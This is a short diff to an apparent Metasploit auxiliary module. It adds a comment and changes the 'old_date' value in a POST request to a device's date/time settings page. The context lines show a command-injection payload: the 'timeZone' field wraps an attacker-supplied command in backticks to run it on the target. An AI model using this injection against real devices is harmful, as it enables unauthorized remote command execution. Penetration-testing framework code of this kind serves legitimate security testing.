@@ -64,6 +64,7 @@ class Metasploit3 < Msf::Auxiliary
 				{
 					'uri'    => uri,
 					'method' => 'POST',
+					#not working without setting encode_params to false!
 					'encode_params' => false,
 					'vars_post' => {
 						"month" => "#{rand(12)}",
@@ -75,7 +76,7 @@ class Metasploit3 < Msf::Auxiliary
 						"timeZone" => "Amsterdam`#{cmd}`",
 						"ntp_type" => "default",
 						"ntpServer" => "none",
-						"old_date" => "+1+12007",
+						"old_date" => " 1 12007",
 						"old_time" => "1210",
 						"old_timeZone" => "Amsterdam",
 						"renew" => "0"
